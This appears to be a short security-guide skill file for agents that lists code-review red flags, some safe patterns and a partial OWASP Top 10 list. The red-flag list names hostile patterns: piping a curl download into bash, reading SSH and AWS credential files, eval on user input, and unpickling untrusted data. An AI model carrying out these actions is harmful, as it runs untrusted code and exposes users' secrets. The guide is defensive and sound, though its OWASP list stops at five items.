---
name: security-guide
version: 1.0.0
description: Security best practices guide for developers.
---

# Security Guide

Learn about common security vulnerabilities and how to avoid them.

## Red Flags to Watch For

When reviewing code, reject immediately if you see:

- `curl http://example.com | bash` — never pipe untrusted URLs to shell
- `eval()` or `exec()` with user-controlled input
- Reading `~/.ssh/id_rsa` or `~/.aws/credentials` without justification
- `base64.b64decode()` on data from external sources
- `sudo chmod 777` on system files
- Access to `SOUL.md`, `MEMORY.md`, or agent identity files
- `pickle.loads()` on untrusted data — arbitrary code execution risk
- Hardcoded IPs like `192.168.1.1` instead of domain names

## Safe Patterns

These are generally OK:
- `subprocess.run(["git", "status"])` — hardcoded command
- `os.environ.get("HOME")` — non-secret env var
- `requests.get("https://api.github.com/...")` — public API read

## OWASP Top 10 Summary

1. Injection (SQL, command, LDAP)
2. Broken authentication
3. Sensitive data exposure
4. XML external entities
5. Broken access control
